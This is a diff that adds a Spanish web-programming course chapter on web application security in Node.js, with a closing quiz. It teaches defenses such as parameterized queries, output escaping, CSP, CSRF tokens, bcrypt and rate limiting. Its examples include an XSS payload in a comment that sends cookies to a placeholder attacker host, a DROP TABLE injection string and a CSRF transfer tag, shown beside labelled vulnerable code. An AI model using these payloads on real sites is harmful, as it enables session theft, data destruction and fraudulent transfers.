@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Seguridad en Aplicaciones Web: Protegiendo tu Código | Español Sin Fronteras</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: Georgia, 'Times New Roman', serif; background: #f8f9fa; color: #1a1a2e; line-height: 1.8; }
+    .wrapper { max-width: 860px; margin: 0 auto; background: #fff; padding: 60px 72px; min-height: 100vh; }
+    .course-tag { font-family: Arial, sans-serif; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.15em; color: #0d9488; margin-bottom: 12px; }
+    h1 { font-size: 2rem; font-weight: 700; color: #0f172a; margin-bottom: 8px; line-height: 1.3; }
+    .subtitle { font-size: 1.05rem; color: #64748b; margin-bottom: 40px; font-style: italic; }
+    hr { border: none; border-top: 2px solid #99f6e4; margin: 32px 0; }
+    h2 { font-size: 1.35rem; font-weight: 700; color: #1e293b; margin: 36px 0 16px; }
+    h3 { font-size: 1.1rem; font-weight: 700; color: #0d9488; margin: 24px 0 10px; }
+    p { margin-bottom: 16px; font-size: 1rem; }
+    ul, ol { margin: 16px 0 16px 24px; }
+    li { margin-bottom: 8px; font-size: 1rem; }
+    .highlight-box { background: #f0fdfa; border-left: 4px solid #0d9488; padding: 20px 24px; border-radius: 0 8px 8px 0; margin: 24px 0; }
+    .danger-box { background: #fff1f2; border-left: 4px solid #e11d48; padding: 20px 24px; border-radius: 0 8px 8px 0; margin: 24px 0; }
+    .example { background: #f1f5f9; border: 1px solid #e2e8f0; border-radius: 8px; padding: 20px 24px; margin: 20px 0; font-family: 'Courier New', monospace; font-size: 0.9rem; white-space: pre-wrap; }
+    table { width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 0.95rem; }
+    th { background: #0d9488; color: white; padding: 12px 16px; text-align: left; font-family: Arial, sans-serif; font-weight: 600; }
+    td { padding: 11px 16px; border-bottom: 1px solid #e2e8f0; }
+    tr:nth-child(even) td { background: #f8fafc; }
+    .summary { background: #0f172a; color: #e2e8f0; border-radius: 12px; padding: 28px 32px; margin: 40px 0 0; }
+    .summary h2 { color: #fff; margin-top: 0; }
+    .summary li { color: #cbd5e1; }
+    @media (max-width: 640px) { .wrapper { padding: 32px 24px; } h1 { font-size: 1.5rem; } }
+  </style>
+</head>
+<body>
+<div class="wrapper">
+  <div class="course-tag">Programación Web · Capítulo 17</div>
+  <h1>Seguridad en Aplicaciones Web: Protegiendo tu Código</h1>
+  <p class="subtitle">Conoce los ataques más comunes contra aplicaciones web y aprende las defensas concretas que todo desarrollador debe implementar.</p>
+  <hr>
+
+  <h2>1. Por Qué la Seguridad es Responsabilidad del Desarrollador</h2>
+  <p>La seguridad no es un módulo que se añade al final — debe integrarse desde el diseño. Las brechas de seguridad cuestan millones de dólares y dañan la confianza de los usuarios irreparablemente. La OWASP (Open Web Application Security Project) publica cada cuatro años los diez riesgos más críticos en aplicaciones web.</p>
+
+  <h2>2. Inyección SQL</h2>
+  <p>El ataque más devastador y aún hoy el más común. Ocurre cuando datos del usuario se insertan directamente en una consulta SQL sin validación.</p>
+
+  <div class="example">// ❌ VULNERABLE — nunca hagas esto
+app.get("/usuarios", (req, res) => {
+  const nombre = req.query.nombre;
+  // Si nombre = "'; DROP TABLE usuarios; --"
+  // La consulta se convierte en código malicioso
+  const query = `SELECT * FROM usuarios WHERE nombre = '${nombre}'`;
+  db.query(query);
+});
+
+// ✅ SEGURO — consultas parametrizadas
+app.get("/usuarios", async (req, res) => {
+  const nombre = req.query.nombre;
+  // Los parámetros se envían por separado — el driver los escapa
+  const [filas] = await db.execute(
+    "SELECT * FROM usuarios WHERE nombre = ?",
+    [nombre]   // El ? nunca puede convertirse en SQL ejecutable
+  );
+  res.json(filas);
+});
+
+// Con PostgreSQL (pg):
+const resultado = await pool.query(
+  "SELECT * FROM usuarios WHERE email = $1 AND activo = $2",
+  [email, true]
+);</div>
+
+  <div class="highlight-box">
+    <strong>Regla de oro:</strong> Nunca concatenes datos del usuario en una consulta SQL. Siempre usa consultas parametrizadas o un ORM (Sequelize, Prisma, TypeORM) que las use internamente.
+  </div>
+
+  <h2>3. XSS — Cross-Site Scripting</h2>
+  <p>Un atacante inyecta código JavaScript malicioso en una página que otros usuarios ven. Ese script puede robar cookies, redirigir usuarios o robar credenciales.</p>
+
+  <h3>XSS Reflejado</h3>
+  <div class="example">// El atacante envía un enlace como:
+// https://misitio.com/buscar?q=&lt;script&gt;fetch('https://malo.com/robar?c='+document.cookie)&lt;/script&gt;
+
+// ❌ VULNERABLE — insertar input del usuario sin sanitizar
+app.get("/buscar", (req, res) => {
+  res.send(`&lt;h1&gt;Resultados para: ${req.query.q}&lt;/h1&gt;`);
+  // Si q contiene &lt;script&gt;, se ejecuta en el navegador
+});
+
+// ✅ SEGURO — escapar caracteres especiales HTML
+function escaparHTML(texto) {
+  return texto
+    .replace(/&amp;/g, "&amp;amp;")
+    .replace(/&lt;/g, "&amp;lt;")
+    .replace(/&gt;/g, "&amp;gt;")
+    .replace(/"/g, "&amp;quot;")
+    .replace(/'/g, "&amp;#039;");
+}
+
+// O usar la librería DOMPurify en el frontend:
+// import DOMPurify from "dompurify";
+// const seguro = DOMPurify.sanitize(contenidoDelUsuario);</div>
+
+  <h3>Content Security Policy (CSP)</h3>
+  <div class="example">// Header que le dice al navegador qué scripts puede ejecutar
+app.use((req, res, next) => {
+  res.setHeader(
+    "Content-Security-Policy",
+    "default-src 'self'; script-src 'self' https://apis.google.com; style-src 'self' 'unsafe-inline'"
+  );
+  next();
+});
+// 'self' = solo scripts del mismo dominio
+// Bloquea automáticamente scripts inyectados por terceros</div>
+
+  <h2>4. CSRF — Cross-Site Request Forgery</h2>
+  <p>Un sitio malicioso hace que el navegador del usuario envíe solicitudes autenticadas a tu aplicación sin que el usuario lo sepa.</p>
+  <div class="example">// ❌ Escenario de ataque:
+// El usuario está logueado en banco.com
+// Visita sitio-malo.com que contiene:
+// &lt;img src="https://banco.com/transferir?monto=5000&amp;destino=atacante"&gt;
+// El navegador envía la solicitud CON las cookies del usuario
+
+// ✅ Protección con tokens CSRF
+const csrf = require("csurf");
+const cookieParser = require("cookie-parser");
+
+app.use(cookieParser());
+app.use(csrf({ cookie: true }));
+
+// En cada formulario, incluir el token CSRF
+app.get("/formulario", (req, res) => {
+  res.render("formulario", { csrfToken: req.csrfToken() });
+});
+
+// El formulario HTML incluye el token oculto:
+// &lt;input type="hidden" name="_csrf" value="{{csrfToken}}"&gt;
+
+// Las solicitudes sin token válido son rechazadas automáticamente</div>
+
+  <h2>5. Hashing de Contraseñas con bcrypt</h2>
+  <div class="highlight-box">
+    <strong>Nunca almacenes contraseñas en texto plano ni con MD5/SHA1.</strong> Usa bcrypt, argon2 o scrypt — algoritmos diseñados específicamente para contraseñas, con factor de trabajo ajustable.
+  </div>
+  <div class="example">const bcrypt = require("bcrypt");
+
+// Al registrar: hashear la contraseña
+async function registrarUsuario(email, contraseña) {
+  const saltRounds = 12; // Cuantas más vueltas, más seguro (y más lento)
+  const hash = await bcrypt.hash(contraseña, saltRounds);
+
+  // Guardar el hash en la base de datos, NUNCA la contraseña original
+  await db.execute(
+    "INSERT INTO usuarios (email, password_hash) VALUES (?, ?)",
+    [email, hash]
+  );
+}
+
+// Al hacer login: comparar con el hash
+async function iniciarSesion(email, contraseñaIngresada) {
+  const [filas] = await db.execute(
+    "SELECT * FROM usuarios WHERE email = ?",
+    [email]
+  );
+
+  if (filas.length === 0) {
+    throw new Error("Credenciales inválidas"); // No revelar si el email existe
+  }
+
+  const usuario = filas[0];
+  const coincide = await bcrypt.compare(contraseñaIngresada, usuario.password_hash);
+
+  if (!coincide) {
+    throw new Error("Credenciales inválidas");
+  }
+
+  return usuario;
+}</div>
+
+  <h2>6. JWT — JSON Web Tokens</h2>
+  <div class="example">const jwt = require("jsonwebtoken");
+
+const SECRET = process.env.JWT_SECRET; // Clave larga y aleatoria
+
+// Generar token al hacer login
+function generarToken(usuario) {
+  return jwt.sign(
+    { id: usuario.id, email: usuario.email, rol: usuario.rol },
+    SECRET,
+    { expiresIn: "7d" }   // Expira en 7 días
+  );
+}
+
+// Middleware para verificar token en rutas protegidas
+function verificarToken(req, res, next) {
+  const authHeader = req.headers.authorization;
+
+  if (!authHeader || !authHeader.startsWith("Bearer ")) {
+    return res.status(401).json({ error: "Token requerido" });
+  }
+
+  const token = authHeader.split(" ")[1];
+
+  try {
+    const payload = jwt.verify(token, SECRET);
+    req.usuario = payload;  // Disponible en el siguiente middleware
+    next();
+  } catch (error) {
+    return res.status(401).json({ error: "Token inválido o expirado" });
+  }
+}
+
+// Usar el middleware en rutas protegidas
+app.get("/api/perfil", verificarToken, (req, res) => {
+  res.json({ usuario: req.usuario });
+});</div>
+
+  <h2>7. Validación y Sanitización de Inputs</h2>
+  <div class="example">// Con la librería express-validator
+const { body, validationResult } = require("express-validator");
+
+app.post("/registro",
+  // Cadena de validaciones
+  body("email").isEmail().normalizeEmail(),
+  body("nombre").trim().isLength({ min: 2, max: 100 }).escape(),
+  body("edad").isInt({ min: 13, max: 120 }),
+  body("password").isLength({ min: 8 })
+    .matches(/^(?=.*[A-Z])(?=.*[0-9])/)
+    .withMessage("Debe contener mayúscula y número"),
+
+  async (req, res) => {
+    const errores = validationResult(req);
+    if (!errores.isEmpty()) {
+      return res.status(422).json({ errores: errores.array() });
+    }
+
+    // Aquí los datos son seguros para usar
+    const { email, nombre, edad, password } = req.body;
+    // ...
+  }
+);</div>
+
+  <h2>8. Rate Limiting</h2>
+  <div class="example">const rateLimit = require("express-rate-limit");
+
+// Limitar intentos de login (protección contra fuerza bruta)
+const limitadorLogin = rateLimit({
+  windowMs: 15 * 60 * 1000, // Ventana de 15 minutos
+  max: 5,                    // Máximo 5 intentos por IP
+  message: { error: "Demasiados intentos. Intenta en 15 minutos." },
+  standardHeaders: true
+});
+
+app.post("/api/auth/login", limitadorLogin, async (req, res) => {
+  // ...
+});
+
+// Límite general para toda la API
+const limitadorGeneral = rateLimit({
+  windowMs: 60 * 1000,  // 1 minuto
+  max: 100              // 100 solicitudes por minuto por IP
+});
+
+app.use("/api/", limitadorGeneral);</div>
+
+  <h2>9. Headers de Seguridad con Helmet</h2>
+  <div class="example">const helmet = require("helmet");
+
+// Helmet configura múltiples headers de seguridad automáticamente
+app.use(helmet());
+
+// Equivalente a configurar manualmente:
+// X-Frame-Options: DENY            → evita clickjacking
+// X-Content-Type-Options: nosniff → evita MIME sniffing
+// Referrer-Policy: no-referrer    → no filtrar URL en referrer
+// Strict-Transport-Security       → forzar HTTPS
+// Content-Security-Policy         → restringir fuentes de scripts</div>
+
+  <table>
+    <tr><th>Vulnerabilidad</th><th>Prevención Principal</th></tr>
+    <tr><td>Inyección SQL</td><td>Consultas parametrizadas / ORM</td></tr>
+    <tr><td>XSS</td><td>Escapar output + CSP headers</td></tr>
+    <tr><td>CSRF</td><td>Tokens CSRF + SameSite cookies</td></tr>
+    <tr><td>Contraseñas débiles</td><td>bcrypt + validación de fortaleza</td></tr>
+    <tr><td>Fuerza bruta</td><td>Rate limiting + bloqueo temporal</td></tr>
+    <tr><td>Dependencias vulnerables</td><td><code>npm audit</code> + actualizaciones regulares</td></tr>
+  </table>
+
+  <div class="summary">
+    <h2>Resumen del Capítulo</h2>
+    <ul>
+      <li>La <strong>inyección SQL</strong> se previene con consultas parametrizadas (<code>?</code> o <code>$1</code>); nunca concatenes datos del usuario en SQL.</li>
+      <li>El <strong>XSS</strong> se previene escapando el HTML antes de mostrarlo y configurando una Content Security Policy que bloquee scripts externos.</li>
+      <li>Las contraseñas deben almacenarse como hashes con <strong>bcrypt</strong> (saltRounds ≥ 10); MD5 y SHA1 son inseguros para contraseñas.</li>
+      <li>Los <strong>JWT</strong> permiten autenticación sin estado; verifica la firma en cada solicitud y establece tiempos de expiración cortos.</li>
+      <li>Valida y sanitiza <strong>todos</strong> los inputs del usuario en el servidor, sin importar lo que el frontend ya valide.</li>
+      <li>El <strong>rate limiting</strong> protege contra ataques de fuerza bruta; limita especialmente los endpoints de autenticación.</li>
+      <li>Usa <strong>Helmet.js</strong> para configurar headers de seguridad HTTP y ejecuta <code>npm audit</code> regularmente para detectar dependencias vulnerables.</li>
+    </ul>
+  </div>
+</div>
+<script>
+window.QUIZ_DATA = {
+  lang: "es",
+  questions: [
+    { q: "¿Cómo se previene la inyección SQL en una aplicación Node.js?", options: ["Validando que el input solo contenga letras", "Usando consultas parametrizadas con `?` o `$1` en lugar de concatenar strings", "Cifrando todos los datos antes de guardarlos", "Limitando el tamaño máximo del input"], correct: 1, feedback: "Las consultas parametrizadas envían los datos del usuario por separado de la consulta SQL. El driver de la base de datos los escapa automáticamente, haciendo imposible que se conviertan en código SQL ejecutable." },
+    { q: "¿Qué tipo de ataque ocurre cuando un atacante inyecta código JavaScript malicioso en una página que otros usuarios verán?", options: ["Inyección SQL", "CSRF", "XSS (Cross-Site Scripting)", "Fuerza bruta"], correct: 2, feedback: "En un ataque XSS (Cross-Site Scripting), el atacante logra que su código JavaScript se ejecute en el navegador de otros usuarios, pudiendo robar cookies de sesión, redirigir a páginas falsas o capturar credenciales." },
+    { q: "¿Qué algoritmo se recomienda para almacenar contraseñas de usuarios?", options: ["MD5", "SHA1", "bcrypt", "Base64"], correct: 2, feedback: "bcrypt (y también argon2 o scrypt) está diseñado específicamente para contraseñas: es lento intencionalmente (para frenar ataques de fuerza bruta) y añade un 'salt' automáticamente para evitar tablas arcoíris. MD5 y SHA1 son inseguros para contraseñas." },
+    { q: "¿Qué hace el parámetro `saltRounds: 12` en `bcrypt.hash(contraseña, 12)`?", options: ["Añade 12 caracteres aleatorios al final de la contraseña", "Determina cuántas veces se aplica el algoritmo de hash, controlando la lentitud deliberada", "Limita la contraseña a 12 caracteres", "Genera 12 versiones diferentes del hash"], correct: 1, feedback: "El número de salt rounds determina cuántas iteraciones aplica bcrypt. A mayor número, más tiempo tarda (y más seguro es contra ataques). 10-12 es el valor recomendado; cada incremento duplica el tiempo de cómputo." },
+    { q: "¿Cómo funciona la protección CSRF con tokens?", options: ["El servidor bloquea todas las solicitudes de dominios externos", "El servidor incluye un token secreto en el formulario; las solicitudes sin ese token son rechazadas", "El navegador bloquea automáticamente las solicitudes entre sitios", "Se cifra toda la comunicación con SSL"], correct: 1, feedback: "El servidor genera un token secreto único por sesión y lo incluye en el formulario. Al recibir una solicitud, verifica que el token sea válido. Un sitio malicioso no puede conocer ese token, por lo que sus solicitudes falsificadas son rechazadas." },
+    { q: "¿Para qué sirve el middleware `helmet` en Express?", options: ["Para comprimir las respuestas HTTP", "Para configurar automáticamente múltiples headers de seguridad HTTP", "Para autenticar usuarios con JWT", "Para validar los inputs del usuario"], correct: 1, feedback: "Helmet configura cabeceras HTTP de seguridad como `X-Frame-Options` (evita clickjacking), `X-Content-Type-Options` (evita MIME sniffing), `Strict-Transport-Security` (fuerza HTTPS) y Content Security Policy." },
+    { q: "¿Qué protege el `rate limiting` en los endpoints de autenticación?", options: ["Protege contra inyección SQL", "Protege contra ataques de fuerza bruta limitando el número de intentos por IP", "Protege contra XSS", "Protege contra acceso no autorizado a rutas protegidas"], correct: 1, feedback: "El rate limiting limita cuántas solicitudes puede hacer una IP en un período de tiempo. En endpoints de login, limita los intentos de contraseña, haciendo inviable un ataque de fuerza bruta que prueba miles de contraseñas." },
+    { q: "¿Qué es el Content Security Policy (CSP)?", options: ["Una política de privacidad de datos del usuario", "Un header HTTP que le dice al navegador qué fuentes de scripts y recursos son permitidas", "Un certificado SSL para cifrar el tráfico", "Un sistema de autenticación de dos factores"], correct: 1, feedback: "El CSP es un header HTTP (`Content-Security-Policy`) que especifica qué dominios pueden servir scripts, estilos, imágenes, etc. Bloquea automáticamente los scripts inyectados por ataques XSS que provengan de orígenes no autorizados." },
+    { q: "¿Por qué es importante que el mensaje de error al hacer login sea 'Credenciales inválidas' en lugar de 'El email no existe'?", options: ["Para que el mensaje sea más corto", "Para no revelar al atacante si un email concreto está registrado en el sistema", "Para cumplir con estándares de accesibilidad", "Por razones de rendimiento del servidor"], correct: 1, feedback: "Mensajes de error específicos como 'email no existe' o 'contraseña incorrecta' permiten a un atacante enumerar qué emails están registrados. Un mensaje genérico 'Credenciales inválidas' evita filtrar esta información." },
+    { q: "¿Qué comando se usa para detectar dependencias npm con vulnerabilidades de seguridad conocidas?", options: ["`npm check`", "`npm security`", "`npm audit`", "`npm scan`"], correct: 2, feedback: "`npm audit` analiza las dependencias del proyecto contra una base de datos de vulnerabilidades conocidas y reporta cuáles necesitan actualización. Se debe ejecutar regularmente y especialmente antes de desplegar a producción." }
+  ]
+};
+</script>
+<script src="quiz-engine.js"></script>
+</body>
+</html>
